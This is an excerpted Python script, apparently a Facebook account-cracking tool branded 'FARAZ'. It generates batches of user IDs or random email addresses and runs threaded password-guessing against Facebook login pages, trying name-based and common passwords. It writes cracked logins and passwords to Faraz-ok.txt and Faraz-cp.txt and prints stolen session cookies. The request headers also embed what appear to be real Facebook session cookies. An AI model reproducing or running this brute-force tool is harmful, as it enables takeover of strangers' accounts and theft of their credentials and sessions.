...
print("Join Our Group For Share Your Result \n ")
print("Join Our Group For Share Your Result")
os.system("xdg-open https://facebook.com/groups/736287171168895/")
...
def method():
	...
	print('[3] Method3 Fast [\x1b[1;92mFast\x1b[1;97m] Working ')
	print('[4] Method3 Fast [\x1b[1;92mFast\x1b[1;97m] ')
	print('[0] Back')
	print(47*'-')
	opt = input('[?] Choose : ')
	if opt =='1':
...
def method1():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [kode, kode+guru, '786786','57273200']
			yaari.submit(mcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in Faraz-ok.txt,Faraz-cp.txt')
	print(47*"-")
...
def mail():
	...
	domain = input('[?] domain : ')
	print(47*'-')
	limit = int(input('[?] How many emails do you want to add : '))
	print(47*'-')
	for nmbr in range(limit):
		number = random.randint(1,999999)
		name = first+last
		id.append(name+str(number)+domain)
	print('[1] Method1 Fast [\x1b[1;92mBest\x1b[1;97m] ')
	print('[2] Method2 Fast [\x1b[1;92mBest\x1b[1;97m] ')
	print('[3] Method3 Fast [\x1b[1;92mFast\x1b[1;97m] Working ')
	print('[4] Method3 Fast [\x1b[1;92mFast\x1b[1;97m] ')
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		tl = str(len(id))
		print('[+] Total Ids : \033[1;92m'+tl)
		print('\033[1;37;1m[$] Brute Has been started...');print(47*"-");print('	USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
		for uid in id:
			pwx = [first+last,first+' '+last,first+'@123',first+'123',first+'@1234',first+'@12345',first+'1234',first+'12345',first+'12',first+'1122','57273200']
			if md == '1':
				yaari.submit(mcrack,uid,pwx,tl)
			elif md == '2':
				...
				yaari.submit(wwwcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
...
def mcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			...
			sys.stdout.write('\r [\033[1;92mFARAZ\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
			sys.stdout.flush()
			...
			if 'c_user' in log_cookies:
				coki = ';'.join([str(a)+'='+str(b) for a,b in session.cookies.get_dict().items()])
				cid = re.search('c_user=(.*?);', coki).group(1)
				print('\033[1;92m[FARAZ-OK] '+cid+' | '+ps+'\033[1;32m')
				cek_apk(session,coki)
				print(47*"\033[1;97m-");print("\033[1;97m[•] Cookie:\033[1;92m"+coki);print(47*"\033[1;97m-")
				open('Faraz-ok.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				cid = session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				print('\033[1;91m[FARAZ-CP] '+cid+' | '+ps+'\033[0;97m')
				open('Faraz-cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			...
			header_freefb = {'authority': 'web.facebook.com',
			'method': 'GET',
			'path': '/home.php?zero_e=2&zero_et=1660531948&_rdc=5&_rdr',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding': 'gzip, deflate, br',
			'accept-language': 'en-US,en;q=0.9',
			'cache-control': 'max-age=0',
			'cookie': 'datr=Y6bkYpnCPrWBbM_VjCfZiq5U; sb=JqfkYgk3EmhUGKO8XxUfKKYd; locale=hi_IN; c_user=100083570056362; fr=0l6MUiKaaSxcVYhiG.AWXSxny8WebCmXo9bcMZLH9qIrc.Bi2h0g.Se.GL4.0.0.Bi-hZS.AWWY5_-gtCw; xs=48%3ArrAXwnifxyqF3A%3A2%3A1660556883%3A-1%3A6814; m_pixel_ratio=1; wd=1025x724',
...
def wwwcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			...
			'accept-encoding': 'gzip, deflate, br',
			'accept-language': 'en-US,en;q=0.9',
			'cookie': 'datr=Y6bkYpnCPrWBbM_VjCfZiq5U; sb=JqfkYgk3EmhUGKO8XxUfKKYd; fr=0l6MUiKaaSxcVYhiG.AWWANFk2xJSUI8QZtSkD9mEg52s.Bi2h0g.Se.AAA.0.0.Bi7kC_.AWV_T6JbEuU; c_user=100083570056362; xs=15%3A24nuY9u8A3sJ2A%3A2%3A1659781311%3A-1%3A6075; wd=400x670; m_pixel_ratio=2',
			'sec-ch-ua': "Chromium;v=104,  Not A;Brand;v=99, Google Chrome;v=104",
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': "Android",
			'sec-fetch-dest': 'document',
